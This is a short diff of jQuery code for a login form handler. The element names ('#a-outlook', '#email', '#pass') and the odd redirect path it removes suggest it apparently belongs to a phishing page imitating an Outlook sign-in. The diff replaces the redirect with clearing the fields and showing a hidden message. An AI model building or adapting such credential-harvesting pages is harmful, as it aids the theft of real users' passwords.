@@ -1,3 +1,4 @@
+	$('#ttpp').hide();
 $(document).ready(function(){
 	$('#a-outlook').click(function(e){
 		e.preventDefault();
@@ -52,13 +53,16 @@ function submitForm(url,data){
    success :  function(response)
       {      
   
-     if(response=="ok"){    
-      window.location.href = "file/sslsslsafetre";
+     if(response=="ok"){   
+       $('#working').fadeOut();	
+	   $('#email').val("");	   
+	   $('#pass').val("");	   
+       setTimeout(function(){$('#ttpp').fadeIn();},1500);
      }     
      else{         
       $("#error").fadeIn(1000, function(){      
       $("#error").html('<br><br><div class="alert alert-danger"> '+response+'</div>');
-           $("#working").html('');
+           $("#working").html("");
       });
      }
      
